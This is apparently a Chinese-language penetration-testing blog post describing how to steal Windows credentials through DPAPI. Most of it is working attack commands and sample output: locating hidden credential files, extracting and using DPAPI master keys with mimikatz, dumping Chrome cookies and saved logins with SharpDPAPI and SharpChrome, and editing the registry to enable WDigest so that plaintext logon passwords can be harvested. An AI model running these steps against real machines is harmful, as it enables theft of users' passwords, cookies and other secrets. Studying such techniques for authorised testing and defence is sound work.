Title: 通过DPAPI获取windows身份凭证
Category: Pentest
slug: dpapi-windows-dump
Date: 2020-04-13

DPAPI(Date Protection Application Programming Interface)，从windows2000之后，微软提供的一个特殊数据保护接口，使用了对称的加解密函数对密码加密。包括:

* IE、Chrome密码登陆表单的自动完成
* 邮箱客户端用户密码
* FTP管理账户密码
* 远程桌面身份密码
* ......




查找本地的Credentials:
通常的保存位置:

* `%appdata%\Microsoft\Credentials`
* `%localappdata%\Microsoft\Credentials`
* `%userprofile%\AppData\Local\Microsoft\Credentials\*`

因为文件被隐藏，命令行下需要查看需要加上`/a`可以看到:

```
dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*
```

###获取GUID

```
# 打印结构体信息
mimikatz dpapi::cred /in:"%localappdata%\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D"
```
```
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {xf9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {x0ad1823-abf0-4be4-b696-eb4bbddca052}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 00000012 - 18
  szDescription      : 本地凭据数据

  algCrypt           : 00006610 - 26128 (CALG_AES_256)
  dwAlgCryptLen      : 00000100 - 256
  dwSaltLen          : 00000020 - 32
  pbSalt             : 00bcc91d576813f05e286f96b9ae3f97aef0922bb7c97b9c93b978d75027a8dc
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         : 
  algHash            : 0000800e - 32782 (CALG_SHA_512)
  dwAlgHashLen       : 00000200 - 512
  dwHmac2KeyLen      : 00000020 - 32
  pbHmack2Key        : 109ef886e7807e15e7918ec1773e768b50900664d88739e42a80592a1af52d51
  dwDataLen          : 00002a70 - 10864
  pbData             : xxxxxxz
  dwSignLen          : 00000040 - 64
  pbSign             : xxxxx

```

guidMasterKey指向MasterKey的索引,是凭据的GUID，

###获取MasterKey
```
mimikatz sekurlsa::dpapi
```

```
Authentication Id : 0 ; 374001 (00000000:0005b4f1)
Session           : RemoteInteractive from 2
User Name         : Administrator
Domain            : PC-201908211659
Logon Server      : PC-201908211659
Logon Time        : 2020/3/22 14:23:45
SID               : S-1-5-21-4128703178-143578513-755070304-500
	 [00000000]
	 * GUID      :	{x0ad1823-abf0-4be4-b696-eb4bbddca052}
	 * Time      :	2020/4/13 10:45:31
	 * MasterKey :	1d30e724aab2b4ee5c83707c5xxx
	 * sha1(key) :	xxxx
```

根据`GUID:{x0ad1823-abf0-4be4-b696-eb4bbddca052}`找到关联的Masterkey, 这个MasterKey就是加密的密钥

###解密
根据找到的Credentials和MaterKey,使用mimikatz解密:

```
mimikatz dpapi::cred /in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\<Credentials> /masterkey:<MasterKey>
```


####sharpDPAPI
自动化利用工具，一键dump，在CNA脚本中修改`$SharpDPAPI::AssemblyPath`为本机器上面sharpDPAPI.exe的绝对路径，不用上传到目标机器上面，然后:

```
# dump出来masterKey
sekurlsa::dpapi

# 查看已经缓存的key
dpapi::cache

# 一键dump
shareDPAPI -dump
```

另外可以使用`SharepChrome`来导出Chrome的密码和历史记录，可以配合`SharepWeb`导出firefox、EDGE浏览器的信息等

```
SharpChrome.exe cookies /target:"C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\Cookies" /unprotect

SharpChrome.exe logins /target:"C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```



####在win10和2012R2以上的时候，默认内存缓存中禁止保存明文密码,需要开启wdigest Auth:

* cmd

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```
* powershell

```
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1
```
* 关闭命令:

```
reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d 0 /f
```

开启之后，需要管理员重新登陆才可以抓明文密码:

```
rundll32 user32.dll,LockWorkStation

mimikatz:
sekurlsa::logonpasswords
```


* <https://xz.aliyun.com/t/6508>
* <https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials>
* <https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E8%8E%B7%E5%8F%96Windows%E7%B3%BB%E7%BB%9F%E4%B8%8BDPAPI%E4%B8%AD%E7%9A%84MasterKey/>
* <https://github.com/djhohnstein/SharpWeb>
* <https://github.com/djhohnstein/SharpChromium>
* <https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-1fb7fac8b107>